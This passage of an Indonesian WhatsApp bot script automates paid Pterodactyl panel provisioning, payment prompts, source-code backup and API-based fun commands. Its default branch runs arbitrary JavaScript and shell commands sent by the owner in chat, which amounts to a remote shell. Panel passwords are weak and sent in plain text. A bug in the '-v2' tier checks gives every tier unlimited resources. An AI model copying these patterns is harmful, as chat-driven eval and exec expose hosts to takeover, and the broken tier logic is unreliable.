let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domain}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
await dwiaff.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isCreator && !isPremium) return m.reply(mess.prem)
if (!text) return m.reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
        🌟 *AKUN PANEL ANDA* 🌟  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  

📌 *Detail Akun:*
───────────────────────────────  
🆔 *ID Server:* ${user.id}  
📛 *Nama Server:* ${name}  
👤 *Username:* ${user.username}  
🔑 *Password:* ${password}  
🌐 *Login URL:* ${global.domainV2}  
───────────────────────────────  

⚠️ *Peraturan Penting:*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
1️⃣ *Dilarang* menggunakan script **DDoS**.  
2️⃣ *Dilarang* membagikan link login atau domain.  
3️⃣ *Garansi hanya berlaku 10 hari* (dengan bukti transfer).  

💾 Simpan data akun Anda dengan baik dan bijak!  

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
          *DWI AFFIFA*  
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`
await dwiaff.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

case "getsc": {
if (!isCreator) return reply(mess.owner)
let dir = await fs.readdirSync("./database/sampah")
if (dir.length >= 2) {
let res = dir.filter(e => e !== "A")
for (let i of res) {
await fs.unlinkSync(`./database/sampah/${i}`)
}}
await m.reply("Memproses backup script bot")
var name = `𝙳𝚆𝙸𝙰𝙵𝙵 𝙰𝚂𝙸𝚂𝚃𝙰𝙽𝚃 𝚅𝟹`
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "️ş̵̛̳̍̃̏͆̏̂̎͌͘͝͝͝͝ẹ̷͓̺̰̽̍͛̉̐̔͋̓̚͜️ş̵̛̳̍̃̏͆̏̂̎͌͘͝͝͝͝️ş̵̛̳̍̃̏͆̏̂̎͌͘͝͝͝͝i̵̢̢̡͚̩̞̥͕̜̻̫̩̐̈͘͜o̶̯͎̱͐̇͋̅̃̈́͋̽̊̀̓͊̃́͋̓️ṉ̵͓̬͈̞̥̭̥̇̓̔͋" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await dwiaff.sendMessage(m.sender, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat")
}
break
//==============================================
case "dana": {
if (!isCreator) return
let teks = `
*PAYMENT DANA JENZD*

* *Nomor :* ${global.dana}
* *Atas Nama :* -

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await dwiaff.sendMessage(m.chat, {text: teks}, {quoted: qtoko})
}
break
case "ovo": {
if (!isCreator) return
let teks = `
*PAYMENT OVO JENZD*

* *Nomor :* ${global.ovo}
* *Atas Nama :* -

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await dwiaff.sendMessage(m.chat, {text: teks}, {quoted: qtoko})
}
break
case "gopay": {
if (!isCreator) return
let teks = `
*PAYMENT GOPAY JENZD*

* *Nomor :* ${global.gopay}
* *Atas Nama :* -

*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`
`
await dwiaff.sendMessage(m.chat, {text: teks}, {quoted: qtoko})
}
break
case "qris": {
if (!isCreator) return 
await dwiaff.sendMessage(m.chat, {image: {url: global.qris}, caption: "\n*PAYMENT QRIS dwiaff*\n\n*[ ! ] Penting :* \`\`\`Wajib kirimkan bukti transfer demi keamanan bersama\`\`\`"}, {quoted: qtoko})
}
break
case "pay": case "payment": {
if (!isCreator) return reply(mess.owner)
let imgdana = await prepareWAMessageMedia({ image: fs.readFileSync("./src/media/dana.jpg")}, { upload: dwiaff.waUploadToServer })
let imgovo = await prepareWAMessageMedia({ image: fs.readFileSync("./src/media/ovo.jpg")}, { upload: dwiaff.waUploadToServer })
let imggopay = await prepareWAMessageMedia({ image: fs.readFileSync("./src/media/gopay.jpg")}, { upload: dwiaff.waUploadToServer })
let imgqris = await prepareWAMessageMedia({ image: fs.readFileSync("./src/media/qris.jpg")}, { upload: dwiaff.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "Pilih Payment Pembayaran"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgdana
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Dana Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.dana}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgovo
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"OVO Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.ovo}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imggopay
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Gopay Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.gopay}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgqris
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\" QRIS Payment\",\"url\":\"${global.qris}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}
]
})
})}
}}, {userJid: m.sender, quoted: qtoko})
await dwiaff.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}
break
//============== [ OWNERMENU ] ==============
case "developerbot": case "owner": {
await dwiaff.sendContact(m.chat, [global.ownerUtama], null)
}
break 

case "self": {
if (!isCreator) return
dwiaff.public = false
m.reply("Berhasil Beralih Ke Mode Self")
}
break
case "public": {
if (!isCreator) return
dwiaff.public = true
m.reply("Berhasil Beralih Ke Mode Public")
}
break
//================ [ DEFAULT ] ================
case 'jarak': case 'rute': case 'cekjarak': case 'cekrute':
 if (!text.includes(',')) return m.reply('Format salah! Gunakan: jarak [kota asal],[kota tujuan]\nContoh: jarak bekasi,madiun');
 
 let [from, to] = text.split(',').map(v => v.trim());
 let biyumaunyepong = `https://api.vreden.my.id/api/tools/jarak?from=${encodeURIComponent(from)}&to=${encodeURIComponent(to)}`;
 try {
 let response = await fetch(biyumaunyepong);
 let data = await response.json();
 if (data.status !== 200) return m.reply('Gagal mendapatkan data jarak! Pastikan kota yang dimasukkan benar.');
 let result = data.result;
 let msg = `📍 *Informasi Jarak* 📍
 
🚗 *Dari:* ${result.asal.alamat} 
📍 *Ke:* ${result.tujuan.alamat} 
📏 *Jarak:* ${result.detail.split('menempuh jarak ')[1].split(',')[0]} 
⏳ *Estimasi Waktu:* ${result.detail.split('estimasi waktu ')[1]} 
⛽ *Estimasi BBM:* ${result.estimasi_biaya_bbm.total_liter} liter (~${result.estimasi_biaya_bbm.total_biaya})

🗺️ *Peta:* ${result.peta_statis}

📍 *Rute Perjalanan:* 
${result.arah_penunjuk_jalan.map(step => `🚘 ${step.instruksi} (${step.jarak})`).join('\n')}`;
 m.reply(msg);
 } catch (e) {
 console.error(e);
 m.reply('Terjadi kesalahan saat mengambil data!');
 }
 break

case "randomhadist":
 {
 fetch("https://api.crafters.biz.id/random/hadits")
 .then((res) => res.json())
 .then((data) => {
 if (!data.status) return dwiaff.sendMessage(m.chat, { text: "Gagal mengambil hadits!" }, { quoted: m });
 let teks = `📖 *Hadits Random*\n\n📌 *Nomor:* ${data.result.nomor}\n📜 *Judul:* ${data.result.judul}\n\n📖 *Teks Arab:*\n${data.result.teks_arab}\n\n🌍 *Terjemahan:*\n${data.result.terjemahan}`;
 dwiaff.sendMessage(m.chat, { text: teks }, { quoted: m });
 })
 .catch(() => dwiaff.sendMessage(m.chat, { text: "Terjadi kesalahan!" }, { quoted: m }));
 }
 break

case 'avos': {
 let validEffects = [
 "sweetheart", "flutter", "pinkglow", "volcano", "petalprint", "giftwrap", "mrfrosty", "littlehelper",
 "sprinklesparkle", "seasonsgreetings", "heartbeat", "valentine", "sapphireheart", "signature", "lollipop",
 "handbag", "tiptoe", "sketchy", "ghostship", "oldenglish", "dragonscale", "magicdust", "substance",
 "piratescove", "backstreet", "funkyzeit", "airman", "foolsgold", "zephyr", "paintbrush", "lokum", "insignia",
 "cottoncandy", "fairygarden", "neonlights", "glowstick", "lavender", "ohhai", "bluegecko", "moderno",
 "petalprint", "rhizome", "devana", "cupcake", "fame", "ionize", "volcano", "broadway", "sweetheart",
 "starshine", "flowerpower", "gobstopper", "discodiva", "medieval", "fruityfresh", "letterboard",
 "greenstone", "alieninvasion", "pinkglow", "pinkcandy", "losttales", "glowtxt", "purple", "yourstruly",
 "electricblue", "greek", "cyrillic", "cyrillic2", "cyrillic3", "korean", "arabic", "arabic2", "arabic3",
 "hindi", "chinese", "japanese", "hebrew", "hebrew2", "hebrew3", "ethiopic", "ethiopic2", "ethiopic3",
 "vietnamese", "icelandic", "bengali", "yoruba", "igbo", "armenian", "armenian2", "georgian", "georgian2",
 "thai", "euro", "euro2", "euro3", "allstars", "dearest", "metropol", "ransom", "bronco", "platformtwo",
 "fictional", "typeface", "stardate", "beachfront", "arthouse", "sterling", "jukebox", "bubbles",
 "invitation", "frontier", "surprise", "firstedition", "republika", "jumble", "warehouse", "orientexpress",
 "orbitron", "starlight", "jet", "tamil", "kannada", "telugu", "punjabi", "malayalam", "odia", "thai2",
 "thai3", "thai4", "hindi2", "hindi3", "hindi4", "hindi5", "hindi6", "hindi7", "hindi8", "euro4",
 "arabic4", "arabic5", "arabic6", "hebrew4", "hebrew5", "hebrew6", "cyrillic4", "japanese2", "japanese3",
 "japanese4", "japanese5", "japanese6", "japanese7", "japanese8", "japanese9", "japanese10", "japanese11",
 "japanese12", "japanese13", "chinese_tc"
 ];

 if (!q.includes(',')) return m.reply(
 `*Format salah!*\n` +
 `Gunakan: *avos teks,effect*\n` +
 `Contoh: *avos Halo,sweetheart*\n\n` +
 `*List effect tersedia:*\n${validEffects.map((v, i) => `${i + 1}. ${v}`).join('\n')}`
 );
 let [text, effect] = q.split(',');
 text = text.trim();
 effect = effect.trim().toLowerCase();
 if (!text || !effect) return m.reply(
 `*Format salah!* Pastikan teks dan effect tidak kosong.\n\n` +
 `*List effect tersedia:*\n${validEffects.map((v, i) => `${i + 1}. ${v}`).join('\n')}`
 );
 if (!validEffects.includes(effect)) {
 return m.reply(
 `*Effect tidak valid!*\nGunakan salah satu dari daftar berikut:\n\n` +
 `${validEffects.map((v, i) => `${i + 1}. ${v}`).join('\n')}`
 );
 }
 let apiUrl = `https://api.crafters.biz.id/maker/avos?text=${encodeURIComponent(text)}&effect=${encodeURIComponent(effect)}`;
 dwiaff.sendMessage(m.chat, { text: 'Sedang diproses...' });
 try {
 let res = await fetch(apiUrl);
 let json = await res.json();
 if (json.status && json.result?.url) {
 dwiaff.sendMessage(m.chat, { 
 image: { url: json.result.url }, 
 caption: `✅ *Berhasil!*\nEffect: *${effect}*` 
 }, { quoted: m });
 } else {
 m.reply('❌ Gagal membuat teks avos. Coba lagi nanti!');
 }
 } catch (e) {
 console.error(e);
 m.reply('⚠️ Terjadi kesalahan dalam mengambil data.');
 }
}
break

case 'ckalender': case 'createkalender': {
 let args = text.split(' ');
 if (args.length < 2) return m.reply('Format salah! Gunakan: ckalender bulan tahun');
 let month = args[0];
 let year = args[1];
 if (isNaN(month) || isNaN(year)) return m.reply('Bulan dan tahun harus berupa angka!');
 let apiUrl = `https://fastrestapis.fasturl.cloud/maker/calendar/simple?month=${month}&year=${year}`;
 dwiaff.sendMessage(m.chat, { image: { url: apiUrl }, caption: `Kalender bulan ${month} tahun ${year}` }, { quoted: m });
 }
 break

case "tahukahkamu": {
 try {
 let response = await fetch("https://api.ownblox.biz.id/api/tahukahkamu");
 let data = await response.json();
 if (data?.result) {
 m.reply(`*Tahukah Kamu?*\n${data.result}`);
 } else {
 m.reply("Gagal mengambil fakta. Coba lagi nanti!");
 }
 } catch (error) {
 console.error(error);
 m.reply("Terjadi kesalahan saat mengambil fakta!");
 }
}
 break

case "cekkhodam": {
if (!q) return m.reply("Namanya?")
const anu = await axios.get(`https://api.ownblox.biz.id/api/cekkhodam?nama=${encodeURIComponent(q)}`)
m.reply(anu.data.result)
}
break

case "scweb": case "sc": {
 if (!isCreator) return reply(mess.owner)
 if (!text) return m.reply(example("https://example.com"))

 try {
 const res = await fetch(text)
 const contentType = res.headers.get("content-type") || ""

 // Jika JSON
 if (contentType.includes("application/json")) {
 const json = await res.json()
 return m.reply("Hasil JSON:\n" + JSON.stringify(json, null, 2))
 }

 // Jika HTML atau lainnya, kirim sebagai dokumen
 const buffer = await res.buffer()
 let ext = "txt"
 if (contentType.includes("text/html")) ext = "html"
 if (contentType.includes("text/plain")) ext = "txt"

 return dwiaff.sendMessage(m.chat, {
 document: buffer,
 fileName: `MamixCode.${ext}`,
 mimetype: contentType
 }, { quoted: m })

 } catch (e) {
 console.error(e)
 m.reply("Gagal mengambil data dari URL. Pastikan link benar.")
 }
}
break

case "pm": {
    if (!isCreator) return reply(mess.owner)
    if (!q.includes("|")) return reply("Format salah!\n\nContoh:\npm 6281234567890|Halo\npm 1234567890-123456789@g.us|Halo grup")

    const [nomor, ...pesanArray] = q.split("|")
    const pesan = pesanArray.join("|").trim()

    if (!nomor || !pesan) return reply("Nomor atau pesan tidak boleh kosong!")

    const isGroupJid = nomor.includes("@g.us")
    const target = isGroupJid ? nomor : nomor.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
    global.lastPmTarget = target

    try {
        await dwiaff.sendMessage(target, { text: pesan })
        reply(`✅ Pesan berhasil dikirim ke ${isGroupJid ? "grup" : "nomor"}: ${nomor}`)
    } catch (err) {
        console.error(err)
        reply("❌ Gagal mengirim pesan.")
    }
}
break

default:
if (budy.startsWith('>')) {
if (!isCreator) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

if (m.text.toLowerCase() == "bot") {
reply("Bot Online ✅")
}

if (budy.startsWith('=>')) {
if (!isCreator) return
try {
let evaled = await eval(`(async () => { ${budy.slice(2)} })()`)
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
} catch (err) {
await m.reply(String(err))
}}

if (budy.startsWith('$')) {
if (!isCreator) return
if (!text) return
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

  }
  } catch (err) {
console.log(require("util").format(err));
  }
};


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
});